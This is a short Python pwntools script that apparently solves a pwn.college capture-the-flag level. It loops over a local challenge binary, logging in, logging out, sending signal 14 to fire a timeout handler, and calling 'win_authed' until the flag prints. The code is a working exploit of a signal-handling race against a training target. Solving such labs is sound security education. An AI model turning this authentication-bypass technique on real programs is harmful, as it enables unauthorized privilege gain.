# Level7 1
import pwn
from dojotool import find_challenge


def ctf() -> None:
    root_bin = find_challenge()

    for count in range(1, 1000):
        print(f"Attempt {count}")
        with pwn.process(root_bin, raw=True, level="error") as io:
            assert io.proc
            io.sendline(b"login")
            io.recvuntil(b"Privilege level: 1")
            io.sendline(b"logout")
            io.proc.send_signal(14)
            io.recvuntil(b"Logging out due to timeout.")
            io.sendline(b"win_authed")
            io.sendline(b"quit")
            data = io.recvrepeat().decode(errors="ignore")
            if "pwn.college{" in data:
                print(data)
                break


if __name__ == "__main__":
    ctf()
